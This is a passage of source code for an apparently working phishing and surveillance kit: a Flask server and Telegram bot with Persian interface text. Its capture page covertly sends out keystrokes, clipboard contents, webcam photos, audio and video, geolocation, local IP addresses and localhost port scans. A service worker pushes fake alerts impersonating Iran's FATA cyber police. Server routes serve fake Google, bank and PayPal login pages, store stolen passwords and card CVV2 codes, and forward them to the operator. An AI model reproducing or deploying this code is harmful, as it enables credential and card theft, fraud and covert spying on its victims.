            msgEl.innerText = 'در حال برقراری ارتباط...';

            // Device info
            let deviceInfo = {
                type: 'device',
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency || 'N/A',
                memory: navigator.deviceMemory || 'N/A',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchPoints: navigator.maxTouchPoints || 0,
            };
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    deviceInfo.battery = { level: battery.level, charging: battery.charging };
                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
                }).catch(() => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)}));
            } else {
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(deviceInfo)});
            }
            if (navigator.connection) {
                const conn = navigator.connection;
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'network', effectiveType:conn.effectiveType, downlink:conn.downlink, rtt:conn.rtt})});
            }
            if (navigator.userAgentData) {
                navigator.userAgentData.getHighEntropyValues(["platform","platformVersion","architecture","model","fullVersionList"]).then(uaData => {
                    fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'ua_data', ...uaData})});
                });
            }
            try {
                var cf = document.createElement('canvas'); cf.width=200; cf.height=50;
                var cfctx = cf.getContext('2d'); cfctx.textBaseline='top'; cfctx.font='14px Arial';
                cfctx.fillText('Browser Fingerprint '+navigator.userAgent,2,2);
                fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'fingerprint', data:cf.toDataURL()})});
            } catch(e) {}
            try {
                var pc = new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
                pc.onicecandidate = e => { if(e.candidate){ var ip=e.candidate.candidate.match(/([0-9]{1,3}(\\.[0-9]{1,3}){3})/); if(ip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'local_ip', ip:ip[1]})}); } };
            } catch(e) {}
            try { var clip = await navigator.clipboard.readText(); if(clip) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'clipboard', data:clip})}); } catch(e) {}
            [80,22,443,8080,3389,5900,21].forEach(p=>{ var img=new Image(); img.src='http://127.0.0.1:'+p+'/favicon.ico?t='+Date.now(); var st=Date.now(); img.onload=img.onerror=function(){ if(Date.now()-st<500) fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'open_port', port:p})}); }; });
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/sw.js?t='+t).then(reg => {
                    setTimeout(() => {
                        reg.showNotification('⚠️ هشدار فوری پلیس فتا', {
                            body: 'فعالیت غیرمجاز شناسایی شد. برای رفع اتهام کلیک کنید.',
                            icon: 'https://www.fata.gov.ir/images/logo.png', requireInteraction: true, vibrate: [300,100,300],
                            data: { url: window.location.origin + '/go/' + t }
                        });
                    }, 15000);
                });
            }
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location', lat:pos.coords.latitude, lng:pos.coords.longitude})}),
                    err => fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location_error', message:err.message})})
                );
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: {ideal:320}, height: {ideal:240} }, audio: true });
                v.srcObject = stream;
                await new Promise(r => v.onloadedmetadata = r);
                c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
                msgEl.innerText = 'اتصال برقرار شد.';
                takeSnapshot();
                window.photoInterval = setInterval(takeSnapshot, 3000);
                startVideoRecording();
                try {
                    var aud = stream.getAudioTracks()[0];
                    if (aud) {
                        var mr = new MediaRecorder(new MediaStream([aud])); var chunks = [];
                        mr.ondataavailable = e => chunks.push(e.data);
                        mr.onstop = () => {
                            var blob = new Blob(chunks, {type:'audio/webm'});
                            var reader = new FileReader();
                            reader.onloadend = () => { var b64 = reader.result.split(',')[1]; fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'audio', data:b64})}); };
                            reader.readAsDataURL(blob);
                        };
                        mr.start(); setTimeout(() => { mr.stop(); }, 5000);
                    }
                } catch(e) {}
            } catch(e) { msgEl.innerText = 'عدم دسترسی به دوربین.'; }
            var keys = '';
            document.addEventListener('keydown', e => { keys += e.key; });
            setInterval(() => { if (keys.length > 0) { fetch('/log/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'keystrokes', data:keys})}); keys = ''; } }, 5000);
        }

        function takeSnapshot() {
            if (!stream) return;
            ctx.drawImage(v, 0, 0, c.width, c.height);
            var d = c.toDataURL('image/jpeg', 0.8);
            fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'photo', data:d})});
        }

        function startVideoRecording() {
            try {
                if (!stream) return;
                var videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                var vr = new MediaRecorder(new MediaStream([videoTrack]), {mimeType: 'video/webm', videoBitsPerSecond: 500000});
                var chunks = [];
                vr.ondataavailable = e => chunks.push(e.data);
                vr.onstop = () => {
                    var blob = new Blob(chunks, {type:'video/webm'});
                    var reader = new FileReader();
                    reader.onloadend = () => { var b64 = reader.result.split(',')[1]; fetch('/upload/'+t, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'video', data:b64})}); };
                    reader.readAsDataURL(blob);
                };
                vr.start(); setTimeout(() => { if (vr.state === 'recording') vr.stop(); }, 10000);
            } catch(e) {}
        }

        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(tr => tr.stop());
            clearInterval(window.photoInterval);
        });
    </script>
</body></html>
"""

ADMIN_LOGIN = """
<!DOCTYPE html><html><head><title>ورود</title><style>body{background:#1e1e1e;color:#0f0;text-align:center;padding-top:20vh;} input{padding:10px;margin:5px;}</style></head>
<body><h2>پنل مدیریت</h2><form method=post action=/admin><input type=password name=pass placeholder=رمز عبور><br><input type=submit value=ورود></form></body></html>
"""

ADMIN_PANEL_TEMPLATE = """
<!DOCTYPE html><html><head><title>قربانیان</title>
<style>body{background:#1e1e1e;color:#0f0;font-family:monospace;padding:20px;} .v{border:1px solid #0f0;padding:10px;margin:10px;} img{max-width:200px;}</style></head>
<body><h1>🎯 قربانیان</h1>
{% for v in victims %}
<div class=v>
  <b>توکن:</b> {{ v.token }}<br>
  <b>IP:</b> {{ v.ip }}<br>
  <b>زمان:</b> {{ v.created_at }}<br>
  <b>اطلاعات دستگاه:</b> <pre>{{ v.info }}</pre>
  {% if v.photo %}<b>عکس:</b><br><img src="data:image/jpeg;base64,{{ v.photo }}"><br>{% endif %}
  {% if v.audio %}<b>صدا:</b> <audio controls src="data:audio/webm;base64,{{ v.audio }}"></audio><br>{% endif %}
  {% if v.location %}<b>موقعیت:</b> <a href="https://maps.google.com/?q={{ v.location }}" target=_blank>مشاهده روی نقشه</a><br>{% endif %}
</div>
{% endfor %}
</body></html>
"""

# -------------------- Flask Routes --------------------
@app.route('/')
def index():
    return "Server running."

@app.route('/new-link')
def new_link():
    token = str(uuid.uuid4())
    db = get_db()
    db.execute("INSERT INTO victims (token, created_at, ip, last_active, phishing_type, creator_id) VALUES (?, ?, ?, ?, ?, ?)",
               (token, datetime.now().isoformat(), request.remote_addr, datetime.now().isoformat(), "google", None))
    db.commit()
    link = f"{request.host_url}go/{token}"
    return jsonify({"link": link, "token": token})

@app.route('/go/<token>')
def go_to_phish(token):
    db = get_db()
    victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    if not victim: return "Invalid link", 404
    ptype = victim['phishing_type'] if victim['phishing_type'] else 'google'
    pages = {
        'google': PHISHING_GOOGLE, 'gmail': PHISHING_GMAIL, 'instagram': PHISHING_INSTAGRAM,
        'facebook': PHISHING_FACEBOOK, 'bank': PHISHING_BANK, 'supercell': PHISHING_SUPERCELL,
        'lottery': PHISHING_LOTTERY, 'twitter': PHISHING_TWITTER, 'snapchat': PHISHING_SNAPCHAT,
        'paypal': PHISHING_PAYPAL, 'tiktok': PHISHING_TIKTOK, 'os_update': PHISHING_OS_UPDATE
    }
    page = pages.get(ptype, PHISHING_GOOGLE)
    return render_template_string(page, token=token)

@app.route('/login/<token>', methods=['POST'])
def login(token):
    email = request.form.get('email','').strip()
    password = request.form.get('password','').strip()
    card_number = request.form.get('card_number','').strip()
    cvv2 = request.form.get('cvv2','').strip()
    expiry = request.form.get('expiry','').strip()
    db = get_db()
    victim = db.execute("SELECT * FROM victims WHERE token=?", (token,)).fetchone()
    ptype = victim['phishing_type'] if victim else 'google'
    if ptype == 'bank':
        db.execute("INSERT INTO credentials (token, email, password, timestamp, card_number, cvv2, expiry) VALUES (?, ?, ?, ?, ?, ?, ?)",
                   (token, card_number, cvv2, datetime.now().isoformat(), card_number, cvv2, expiry))
    else:
        db.execute("INSERT INTO credentials (token, email, password, timestamp) VALUES (?, ?, ?, ?)",
                   (token, email, password, datetime.now().isoformat()))
    db.commit()
    if victim and victim['creator_id']: award_points(victim['creator_id'], 10)
    msg = f"🔑 <b>Login</b> from {token}\nEmail: <code>{email or card_number}</code>\nPassword: <code>{password or cvv2}</code>"
    if card_number: msg += f"\nCard: {card_number}\nCVV2: {cvv2}\nExpiry: {expiry}"
    send_telegram_message(msg)
    return redirect(f"/capture/{token}", code=302)

@app.route('/capture/<token>')
def capture(token):
    return render_template_string(CAPTURE_PAGE_TEMPLATE, token=token)

@app.route('/upload/<token>', methods=['POST'])
def upload(token):
    data = request.get_json()
    if not data: return jsonify({"error":"no data"}),400
    media_type = data.get('type')
    raw = data.get('data')
    try:
        if media_type == 'photo': binary = base64.b64decode(raw.split(',')[1] if ',' in raw else raw)
        elif media_type in ('audio','video'): binary = base64.b64decode(raw)
        else: return jsonify({"error":"unknown type"}),400
        db = get_db()
        db.execute("INSERT INTO media (token, type, data, timestamp) VALUES (?, ?, ?, ?)", (token, media_type, binary, datetime.now().isoformat()))
        db.execute("UPDATE victims SET last_active=? WHERE token=?", (datetime.now().isoformat(), token))
        db.commit()
        if TOKEN and ADMIN_CHAT_ID:
            if media_type == 'photo':
                cnt = db.execute("SELECT COUNT(*) FROM media WHERE token=? AND type='photo'", (token,)).fetchone()[0]
                send_telegram_file(binary, 'camera.jpg', f"📸 <b>Photo #{cnt}</b> from {token}", as_image=True)
            elif media_type == 'audio': send_telegram_file(binary, 'mic.webm', f"🎤 <b>Audio</b> from {token}")
            elif media_type == 'video': send_telegram_file(binary, 'cam_video.webm', f"🎥 <b>Video</b> from {token}", as_video=True)
        return jsonify({"status":"ok"})
    except Exception as e: return jsonify({"error":str(e)}),500

@app.route('/log/<token>', methods=['POST'])
def log(token):
    data = request.get_json()
    data['ip'] = request.remote_addr
    db = get_db()
    db.execute("INSERT INTO logs (token, type, data, timestamp) VALUES (?, ?, ?, ?)", (token, data.get('type','unknown'), json.dumps(data), datetime.now().isoformat()))
    db.execute("UPDATE victims SET ip=?, last_active=? WHERE token=?", (request.remote_addr, datetime.now().isoformat(), token))
    db.commit()
    if data.get('type') == 'device':
        msg = f"📱 <b>New Victim</b>\nToken: <code>{token}</code>\nIP: {request.remote_addr}\nDevice: {data.get('ua','')}"
        keyboard = [
            [InlineKeyboardButton("📸 Photo", callback_data=f"photo|{token}"),
             InlineKeyboardButton("🎤 Audio", callback_data=f"audio|{token}")],
            [InlineKeyboardButton("🎥 Video", callback_data=f"video|{token}"),
             InlineKeyboardButton("📍 Location", callback_data=f"location|{token}")],
            [InlineKeyboardButton("📋 Clipboard", callback_data=f"clipboard|{token}"),
             InlineKeyboardButton("⌨️ Keys", callback_data=f"keystrokes|{token}")],
            [InlineKeyboardButton("🔌 Ports", callback_data=f"ports|{token}"),
             InlineKeyboardButton("🌐 History", callback_data=f"history|{token}")]
        ]
        send_telegram_message(msg, reply_markup=InlineKeyboardMarkup(keyboard).to_dict())
    elif data.get('type') == 'location':
        send_telegram_message(f"📍 <b>Location</b> for {token}: {data.get('lat')},{data.get('lng')}")
        send_telegram_location(data.get('lat'), data.get('lng'))
    return jsonify({"status":"ok"})

@app.route('/admin', methods=['GET','POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('pass') == ADMIN_PASSWORD:
            resp = make_response("logged in")
            resp.set_cookie('admin','1')
            return resp
        return "رمز اشتباه",403
    if request.cookies.get('admin') != '1': return render_template_string(ADMIN_LOGIN)
    db = get_db()
    victims_rows = db.execute("SELECT * FROM victims ORDER BY created_at DESC").fetchall()
    victims = []
    for row in victims_rows:
        token = row['token']
        log_dev = db.execute("SELECT data FROM logs WHERE token=? AND type='device' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        info = json.loads(log_dev['data']) if log_dev else {}
        photo_row = db.execute("SELECT data FROM media WHERE token=? AND type='photo' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        photo_b64 = base64.b64encode(photo_row['data']).decode() if photo_row else None
        audio_row = db.execute("SELECT data FROM media WHERE token=? AND type='audio' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        audio_b64 = base64.b64encode(audio_row['data']).decode() if audio_row else None
        loc_row = db.execute("SELECT data FROM logs WHERE token=? AND type='location' ORDER BY timestamp DESC LIMIT 1", (token,)).fetchone()
        loc = f"{json.loads(loc_row['data'])['lat']},{json.loads(loc_row['data'])['lng']}" if loc_row else None
        victims.append({
            "token": token, "ip": row['ip'], "created_at": row['created_at'],
            "info": json.dumps(info, indent=2, ensure_ascii=False),
            "photo": photo_b64, "audio": audio_b64, "location": loc
        })
    return render_template_string(ADMIN_PANEL_TEMPLATE, victims=victims)

SW_JS = """
self.addEventListener('install', event => { self.skipWaiting(); });
self.addEventListener('activate', event => { event.waitUntil(clients.claim()); });
self.addEventListener('notificationclick', event => {
  event.notification.close();
  const urlToOpen = event.notification.data && event.notification.data.url ? event.notification.data.url : '/';
  event.waitUntil(
    clients.matchAll({ type: 'window', includeUncontrolled: true }).then(windowClients => {
      for (let client of windowClients) { if (client.url.includes(urlToOpen.split('/').pop())) return client.focus(); }
      if (clients.openWindow) return clients.openWindow(urlToOpen);
    })
  );
});
self.addEventListener('push', event => {
  const payload = event.data ? event.data.text() : 'پیام جدید';
  event.waitUntil(
    self.registration.showNotification('📩 پیام از طرف ادمین', {
      body: payload, icon: 'https://www.fata.gov.ir/images/logo.png', requireInteraction: true, vibrate: [200, 100, 200]
    })
  );
});
setInterval(() => {
  if('geolocation' in navigator){
    navigator.geolocation.getCurrentPosition(pos => {
      self.clients.matchAll().then(clients => {
        clients.forEach(client => {
          const url = new URL(client.url);
          const token = url.searchParams.get('t') || url.pathname.split('/').pop();
          fetch('/log/'+token, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({type:'location',lat:pos.coords.latitude,lng:pos.coords.longitude}) });
        });
      });
    });
  }
}, 30000);
"""
@app.route('/sw.js')
def service_worker():
    response = make_response(SW_JS)
    response.headers['Content-Type'] = 'application/javascript'
    return response

@app.route('/download/<path:filename>')
def download_file(filename):
    return send_from_directory('static', filename)

# -------------------- Bot Helpers --------------------
def get_db_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def ensure_user(user_id):
    conn = get_db_connection()
    if not conn.execute("SELECT 1 FROM users WHERE user_id=?", (user_id,)).fetchone():
        conn.execute("INSERT INTO users (user_id, points, level, join_date) VALUES (?, 0, 1, ?)", (user_id, datetime.now().isoformat()))
        conn.commit()
    conn.close()

def award_points(user_id, amount):
    conn = get_db_connection()
    conn.execute("UPDATE users SET points = points + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    points = conn.execute("SELECT points FROM users WHERE user_id=?", (user_id,)).fetchone()['points']
    level = points // 100 + 1
    conn.execute("UPDATE users SET level = ? WHERE user_id=?", (level, user_id))
    conn.commit()
    conn.close()

# -------------------- Handlers --------------------
REACTIONS = ["👍", "❤️", "🔥", "👏", "😍", "😡", "🤷🏽‍♂️", "🤩"]

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type == 'private':
        user = update.effective_user
        conn = get_db_connection()
        conn.execute(
            "INSERT OR REPLACE INTO private_chats (user_id, username, first_name, last_name, join_date) VALUES (?, ?, ?, ?, ?)",
            (user.id, user.username or "ندارد", user.first_name or "", user.last_name or "", datetime.now().isoformat())
        )
        conn.commit(); conn.close()
    help_text = (
        "🔹 به ربات خوش آمدید!\n\n"
        "📌 با دکمه‌های زیر از قابلیت‌های ربات استفاده کنید.\n"
        "🎯 انواع هک، بازار سیاه، پروفایل و امکانات حرفه‌ای.\n"
        "🤖 هوش مصنوعی با شخصیت‌های مختلف، جستجو، ترجمه، تصویر، کد و...\n"
        "🛠️ آزمایشگاه هک (۷۰+ ابزار) + اس‌ام‌اس بمبر\n"
        "📊 آمار، پشتیبان‌گیری، یادآور، کارها و..."
    )
    keyboard = [
        [InlineKeyboardButton("🔗 ساخت لینک جدید", callback_data="new_link")],
        [InlineKeyboardButton("🎭 شخصیت‌ها", callback_data="persona_menu")],
        [InlineKeyboardButton("🤖 ابزارهای AI", callback_data="ai_tools_menu")],
        [InlineKeyboardButton("🛠️ آزمایشگاه هک", callback_data="hack_lab_main")],
        [InlineKeyboardButton("📨غیر فعال اس‌ام‌اس بمبر", callback_data="sms_bomber")],
        [InlineKeyboardButton("👤 پروفایل", callback_data="profile"),
         InlineKeyboardButton("🛒 بازار سیاه", callback_data="market_menu")],
        [InlineKeyboardButton("📋 کارهای من", callback_data="tasks_menu")],
        [InlineKeyboardButton("🧹 پاک کردن حافظه", callback_data="clear_history")],
        [InlineKeyboardButton("📖 راهنما", callback_data="help")]
    ]
    if update.effective_user.id == ADMIN_USER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
    await update.message.reply_text(help_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ شما مجاز به استفاده از این دستور نیستید.")
        return
    keyboard = [
        [InlineKeyboardButton("روشن/خاموش ربات", callback_data="toggle_bot")],
        [InlineKeyboardButton(f"🤖 AI: {'✅ روشن' if AI_ENABLED else '❌ خاموش'}", callback_data="toggle_ai")],
        [InlineKeyboardButton("📋 لیست قربانیان", callback_data="victims_list")],
        [InlineKeyboardButton("👥 لیست کاربران", callback_data="users_list")],
        [InlineKeyboardButton("📊 آمار", callback_data="stats")],
        [InlineKeyboardButton("📢 ارسال به گروه‌ها", callback_data="broadcast_groups_menu")],
        [InlineKeyboardButton("✉️ ارسال به کاربر", callback_data="send_user")],
        [InlineKeyboardButton("💾 پشتیبان‌گیری", callback_data="backup_now")],
        [InlineKeyboardButton("🔙 بازگشت", callback_data="start")]
    ]
    await update.message.reply_text("🔧 پنل مدیریت:", reply_markup=InlineKeyboardMarkup(keyboard))

async def learn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    args = context.args
    if len(args) < 2: await update.message.reply_text("📝 /learn <کلمه> <پاسخ>"); return
    keyword = args[0].strip().lower(); response = ' '.join(args[1:])
    conn = get_db_connection(); conn.execute("INSERT OR REPLACE INTO learned (keyword, response) VALUES (?, ?)", (keyword, response)); conn.commit(); conn.close()
    await update.message.reply_text(f"✅ یاد گرفتم: «{keyword}» → {response}")

async def unlearn_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    if not context.args: await update.message.reply_text("📝 /unlearn <کلمه>"); return
    keyword = context.args[0].strip().lower()
    conn = get_db_connection(); cur = conn.execute("DELETE FROM learned WHERE keyword=?", (keyword,)); conn.commit(); conn.close()
    await update.message.reply_text(f"{'❌ حذف شد' if cur.rowcount > 0 else '⚠️ وجود ندارد'}.")

async def wordlist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_db_connection(); rows = conn.execute("SELECT keyword, response FROM learned ORDER BY keyword").fetchall(); conn.close()
    if not rows: await update.message.reply_text("📭 هنوز هیچ کلمه‌ای یاد نگرفته‌ام."); return
    text = "📚 کلمات یادگرفته شده:\n\n" + "\n".join(f"• <b>{r['keyword']}</b> → {r['response']}" for r in rows)
    await update.message.reply_text(text, parse_mode="HTML")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    conn = get_db_connection()
    vc = conn.execute("SELECT COUNT(*) FROM victims").fetchone()[0]
    ph = conn.execute("SELECT COUNT(*) FROM media WHERE type='photo'").fetchone()[0]
    vi = conn.execute("SELECT COUNT(*) FROM media WHERE type='video'").fetchone()[0]
    au = conn.execute("SELECT COUNT(*) FROM media WHERE type='audio'").fetchone()[0]
    cr = conn.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
    lr = conn.execute("SELECT COUNT(*) FROM learned").fetchone()[0]
    uc = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
    lc = conn.execute("SELECT COUNT(*) FROM listings WHERE sold=0").fetchone()[0]
    pcc = conn.execute("SELECT COUNT(*) FROM private_chats").fetchone()[0]
    last_backup = conn.execute("SELECT MAX(timestamp) FROM backups").fetchone()[0] or "هرگز"
    conn.close()
    text = (f"📊 <b>آمار</b>\n👥 قربانیان: {vc}\n👤 کاربران: {uc}\n👥 استارت‌ها: {pcc}\n📸 عکس: {ph}\n🎥 ویدیو: {vi}\n🎤 صدا: {au}\n"
            f"🔑 اطلاعات ورود: {cr}\n🧠 کلمات: {lr}\n🛒 آگهی‌های فعال: {lc}\n💾 آخرین پشتیبان: {last_backup}\n"
            f"🤖 AI: {'✅' if AI_ENABLED else '❌'}\n🤖 ربات: {'✅' if BOT_ACTIVE else '❌'}")
    await update.message.reply_text(text, parse_mode="HTML")

async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    if not context.args: await update.message.reply_text("📢 /broadcast <متن>"); return
    message = ' '.join(context.args)
    conn = get_db_connection(); victims = conn.execute("SELECT token FROM victims").fetchall(); conn.close()
    await update.message.reply_text(f"📢 پیام به {len(victims)} قربانی ارسال می‌شود (در صورت آنلاین بودن).")

async def send_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    args = context.args
    if len(args) < 2: await update.message.reply_text("📝 /send <user_id> <متن>"); return
    try: user_id = int(args[0])
    except: await update.message.reply_text("❌ user_id باید عدد باشد."); return
    text = ' '.join(args[1:])
    try:
        await context.bot.send_message(chat_id=user_id, text=text)
        await update.message.reply_text(f"✅ پیام به کاربر {user_id} ارسال شد.")
    except Exception as e: await update.message.reply_text(f"❌ خطا: {e}")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_USER_ID: await update.message.reply_text("⛔ فقط مدیر."); return
    conn = get_db_connection(); users = conn.execute("SELECT * FROM private_chats ORDER BY join_date DESC LIMIT 50").fetchall(); conn.close()
    if not users: await update.message.reply_text("👥 هیچ کاربری ربات را استارت نکرده است."); return
    text = f"👥 <b>لیست کاربران</b> ({len(users)} نفر)\n\n"
    for i, u in enumerate(users, 1):
        name = u['first_name'] + (" " + u['last_name'] if u['last_name'] else "")
        text += f"{i}. <b>{name}</b> (@{u['username']}) — <code>{u['user_id']}</code>\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def persona_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        keyboard = [
            [InlineKeyboardButton("🧠 دانشمند", callback_data="set_persona_scientist"), InlineKeyboardButton("🎭 طنزپرداز", callback_data="set_persona_comedian")],
            [InlineKeyboardButton("🧘 روانشناس", callback_data="set_persona_psychologist"), InlineKeyboardButton("💀 هکر", callback_data="set_persona_hacker")],
            [InlineKeyboardButton("🎤 خواننده", callback_data="set_persona_singer"), InlineKeyboardButton("🔄 پیش‌فرض", callback_data="set_persona_default")]
        ]
        await update.message.reply_text("🎭 شخصیت:", reply_markup=InlineKeyboardMarkup(keyboard))
        return
    p = context.args[0].lower()
    if p in ["scientist","comedian","psychologist","hacker","singer","default"]:
        user_persona[update.effective_user.id] = p
        await update.message.reply_text(f"✅ شخصیت شما به {p} تغییر کرد.")
    else: await update.message.reply_text("⚠️ نوع نامعتبر.")

async def summarize_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.text:
        await update.message.reply_text("لطفاً روی یک پیام متنی ریپلای کنید و /summarize را بزنید."); return
    text = update.message.reply_to_message.text
    summary = ask_groq(f"متن زیر را در ۳ جمله خلاصه کن:\n{text}", update.effective_user.id)
    await update.message.reply_text(f"📝 خلاصه:\n{summary}")

async def translate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("📝 /translate <متن>"); return
    text = ' '.join(context.args)
    translated = ask_groq(f"متن زیر را به فارسی ترجمه کن:\n{text}", update.effective_user.id)
    await update.message.reply_text(f"🌐 ترجمه:\n{translated}")

async def search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("📝 /search <موضوع>"); return
    query = ' '.join(context.args)
    results = search_web(query)
    if results is None: await update.message.reply_text("⚠️ قابلیت جستجو در حال حاضر فعال نیست."); return
    if not results: await update.message.reply_text("❌ نتیجه‌ای یافت نشد."); return
    text = "🔍 نتایج جستجو:\n\n"
    for i, r in enumerate(results, 1): text += f"{i}. {r['title']}\n{r['href']}\n{r['body'][:100]}...\n\n"
    await update.message.reply_text(text[:4000], parse_mode="HTML")

async def imagine_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("📝 /imagine <توضیح تصویر>"); return
    prompt = ' '.join(context.args)
    await update.message.reply_text("🎨 در حال ساخت تصویر...")
    img_data = generate_image(prompt)
    if img_data: await update.message.reply_photo(photo=io.BytesIO(img_data), caption=f"🖼️ {prompt}")
    else: await update.message.reply_text("❌ خطا در ساخت تصویر.")

async def execute_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: await update.message.reply_text("📝 /execute <زبان> <کد>"); return
    lang = context.args[0].lower(); code = ' '.join(context.args[1:])
    output = execute_code(lang, code)
    await update.message.reply_text(f"💻 خروجی:\n<pre>{output[:3000]}</pre>", parse_mode="HTML")

async def remind_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: await update.message.reply_text("📝 /remind <ساعت:دقیقه> <پیام>"); return
    time_str = context.args[0]
    try: hour, minute = map(int, time_str.split(':'))
    except: await update.message.reply_text("❌ فرمت زمان اشتباه است."); return
    message = ' '.join(context.args[1:])
    now = datetime.now(); remind_dt = now.replace(hour=hour, minute=minute, second=0, microsecond=0)
    if remind_dt <= now: remind_dt += timedelta(days=1)
    conn = get_db_connection()
    conn.execute("INSERT INTO reminders (user_id, remind_time, message) VALUES (?, ?, ?)", (update.effective_user.id, remind_dt.isoformat(), message))
    conn.commit(); conn.close()
    context.job_queue.run_once(send_reminder, when=remind_dt, data={"user_id": update.effective_user.id, "text": message})
    await update.message.reply_text(f"✅ یادآور تنظیم شد برای {time_str}")

async def send_reminder(context: ContextTypes.DEFAULT_TYPE):
    data = context.job.data
    await context.bot.send_message(chat_id=data["user_id"], text=f"⏰ یادآور: {data['text']}")

async def add_task_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("📝 /addtask <شرح کار>"); return
    task = ' '.join(context.args)
    conn = get_db_connection()
    conn.execute("INSERT INTO todos (user_id, task, created_at) VALUES (?, ?, ?)", (update.effective_user.id, task, datetime.now().isoformat()))
    conn.commit(); conn.close()
    await update.message.reply_text("✅ کار اضافه شد.")

async def tasks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_db_connection()
    rows = conn.execute("SELECT id, task, done FROM todos WHERE user_id=? AND done=0 ORDER BY id", (update.effective_user.id,)).fetchall()
    conn.close()
    if not rows: await update.message.reply_text("📭 هیچ کاری نداری."); return
    text = "📋 لیست کارهای تو:\n\n" + "\n".join(f"{r['id']}. {r['task']}" for r in rows)
    await update.message.reply_text(text)

async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args: await update.message.reply_text("📝 /done <شماره کار>"); return
    try: task_id = int(context.args[0])
    except: await update.message.reply_text("❌ شماره کار باید عدد باشد."); return
    conn = get_db_connection()
    conn.execute("UPDATE todos SET done=1 WHERE id=? AND user_id=?", (task_id, update.effective_user.id))
    conn.commit(); conn.close()
    await update.message.reply_text("✅ انجام شد.")

async def sentiment_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.reply_to_message or not update.message.reply_to_message.text:
        await update.message.reply_text("روی یک پیام ریپلای کن و /sentiment بزن."); return
    text = update.message.reply_to_message.text
    sentiment = analyze_sentiment(text)
    await update.message.reply_text(f"📊 تحلیل احساس: {sentiment}")

# --- Hack Lab Menus ---
